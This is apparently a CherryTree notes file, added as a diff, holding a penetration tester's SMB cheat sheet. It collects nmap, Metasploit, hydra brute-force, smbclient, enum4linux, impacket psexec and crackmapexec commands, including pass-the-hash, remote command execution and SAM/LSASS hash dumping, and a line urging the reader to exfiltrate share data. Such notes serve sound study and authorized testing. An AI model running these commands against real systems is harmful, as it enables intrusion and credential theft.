@@ -1,0 +1,139 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="445 - SMB" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704064102" ts_lastsave="1704139702">
+    <rich_text underline="single" weight="heavy">Nmap Scripts</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">nmblookup</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text underline="single" weight="heavy">MetaSploit</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">BruteForcing</rich_text>
+    <rich_text>
+Always use hydra, it's easy and fast.
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">SMBClient</rich_text>
+    <rich_text>
+Please browse the shares and exfiltrate data instead of just attempting to exploit!
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+You can utilize help to find out what you can do once connected. However, you will be using a lot of the following:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Enum4Linux</rich_text>
+    <rich_text>
+
+This tool is kind of the SMB swiss army knife you'll want to utilize when you see SMB.
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">PSEXEC</rich_text>
+    <rich_text>
+
+Once you have credentials you will want to perform the following as you can issue commands and get a shell via PSEXEC. Additionally use the psexec metasploit modules as those might be more useful.
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">CrackMap Exec</rich_text>
+    <rich_text>
+
+
+
+More information:
+</rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html</rich_text>
+    <rich_text>
+</rich_text>
+    <codebox char_offset="13" justification="left" frame_width="1422" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -sU --top-ports 25 #port 137, 138 are udp smb ports. check if open
+nmap -p 445 ip.addr --script=smb-protocols #lists supported protocols check if EternalBlue is possible if you see v1
+nmap -p 445 ip.addr --script=smb-security-mode #guest account?
+nmap -p 445 ip.addr --script=smb-os-discovery.nse #NetBIOS computer name and OS
+nmap -p 445 ip.addr --script=smb-enum-sessions #enum logged in users
+nmap -p 445 ip.addr --script=smb-enum-sessions --script-args smbusername=,smbpassword= #if you have credentials
+nmap -p 445 ip.addr --script=smb-enum-users #lists all discoverable users
+nmap -p 445 ip.addr --script=smb-enum-shares #enum shares as guest
+nmap -p 445 ip.addr --script=smb-enum-shares,smb-ls --script-args smbusername=,smbpassword= #builds a directory tree
+nmap -p 445 ip.addr --script=smb-enum-shares --script-args smbusername=,smbpassword= #if IPC$ share had RW perms - lets anon users enum shares, accounts etc
+nmap -p 445 ip.addr --script=smb-enum-users --script-args smbusername=,smbpassword= #enum user acc on target sys
+nmap -p 445 ip.addr --script=smb-server-stats --script-args smbusername=,smbpassword=
+nmap -p 445 ip.addr --script=smb-enum-domains --script-args smbusername=,smbpassword=
+nmap -p 445 ip.addr --script=smb-enum-groups --script-args smbusername=,smbpassword=
+nmap -p 445 ip.addr --script=smb-enum-services --script-args smbusername=,smbpassword=
+nmap --script smb-vuln* -p 139,445 ip.addr #will check for vulnerabilities</codebox>
+    <codebox char_offset="26" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmblookup -A ip.addr</codebox>
+    <codebox char_offset="39" justification="left" frame_width="900" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">auxiliary/scanner/smb/smb_version #exact version of smb
+auxiliary/scanner/smb/smb2 #smb2 protocol supported?
+auxiliary/scanner/smb/smb_enumusers
+auxiliary/scanner/smb/smb_enumshares
+auxiliary/scanner/smb/pipe_auditor #determine what named pipes are accessible over SMB (req creds)
+auxiliary/scanner/smb/smb_login #smb brute
+auxiliary/scanner/smb/smb_ms17_010 #eternalblue vuln tester
+auxiliary/scanner/smb/smb_lookupsid #enumerate local users
+exploit/windows/smb/psexec #requires credentials see more info on PSEXEC below</codebox>
+    <codebox char_offset="93" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -L user.txt -P pass.txt ip.addr -V -f smb</codebox>
+    <codebox char_offset="190" justification="left" frame_width="819" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -L &lt;ip&gt; -N #list sharenames and domains with no pass with anonymous connection.
+smbclient -L &lt;ip&gt; -U &lt;user&gt; #authenticate as a user with legit creds
+smbclient //&lt;ip&gt;/public -N
+smbclient //&lt;ip&gt;/public -U user</codebox>
+    <codebox char_offset="309" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smb&gt; ls
+smb&gt; get folder</codebox>
+    <codebox char_offset="412" justification="left" frame_width="855" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a ip.addr #will check all
+enum4linux -o ip.addr #get os version
+enum4linux -U ip.addr #enum users (use -u -p for auth enum)
+enum4linux -S ip.addr #enum shares
+enum4linux -G ip.addr #enum domain groups
+enum4linux -i ip.addr #get printer info'
+enum4linux -r -u "admin" -p "password" ip.addr #enum users via RID cycling. S-1-22-1-1003 etc</codebox>
+    <codebox char_offset="621" justification="left" frame_width="621" frame_height="55" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
+chmod +x psexec.py
+python3 psexec.py Administrator@ip</codebox>
+    <codebox char_offset="639" justification="left" frame_width="980" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb ip.addr -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
+crackmapexec smb ip.addr -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
+crackmapexec smb ip.addr -u Administrator -H &lt;NTHASH&gt; -x whoami #Pass-the-Hash
+# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}
+
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sam #Dump SAM
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sessions #Get sessions (
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --loggedon-users #Get logged-on users
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --disks #Enumerate the disks
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --users #Enumerate users
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --groups # Enumerate groups
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --local-groups # Enumerate local groups
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --pass-pol #Get password policy
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -p 'password' --rid-brute #RID brute
+
+crackmapexec smb ip.addr -d &lt;DOMAIN&gt; -u Administrator -H &lt;HASH&gt; #Pass-The-Hash</codebox>
+  </node>
+</cherrytree>
